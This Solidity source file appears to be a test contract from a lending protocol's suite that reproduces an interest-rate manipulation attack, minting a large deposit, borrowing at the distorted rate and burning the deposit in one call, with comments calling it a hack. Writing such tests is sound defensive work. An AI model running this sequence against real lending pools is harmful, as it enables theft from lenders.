pragma solidity ^0.5.17;
pragma experimental ABIEncoderV2;
// "SPDX-License-Identifier: Apache-2.0"

import "../interfaces/IERC20.sol";

interface IToken {
    function burn(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);
    function mint(address receiver, uint256 depositAmount) external returns (uint256 mintAmount);
	function borrow(
		bytes32 loanId, /// 0 if new loan.
		uint256 withdrawAmount,
		uint256 initialLoanDuration, /// Duration in seconds.
		uint256 collateralTokenSent, /// If 0, loanId must be provided; any rBTC sent must equal this value.
		address collateralTokenAddress, /// If address(0), this means rBTC and rBTC must be sent with the call or loanId must be provided.
		address borrower,
		address receiver,
		bytes calldata /// loanDataBytes: arbitrary order data (for future use).
	)
		external
		payable
		returns (
			uint256,
			uint256 /// Returns new principal and new collateral added to loan.
		);
}

contract MintLoanAndBorrowTest {
	function callMintAndBorrowAndBurn(
		address loanToken, /// Underlying Token.
		address iToken, /// Lending Pool.
		uint256 collateralTokenSent, /// Borrowing collateral.
        uint256 withdrawAmount, /// Borrowing principal.
        uint256 hackDepositAmount /// Amount of underlying token to deposit on lending pool.
	) public {
		IToken iTokenContract = IToken(iToken);
        
        /// @dev Allow the lending pool, iToken to get a deposit from this contract as a lender.
        IERC20(iToken).approve(iToken, hackDepositAmount);

        /// @dev Make a deposit as a lender, in order to manipulate the interest rate of the lending pool.
		iTokenContract.mint(address(this), hackDepositAmount);

        /// @dev Borrow liquidity from the pool at an unfair rate.
        iTokenContract.borrow("0x0", collateralTokenSent, 86400, withdrawAmount, loanToken, address(this), address(this), "0x0");

        /// @dev Get back the amount deposited in the first place.
        iTokenContract.burn(address(this), hackDepositAmount);
	}
}
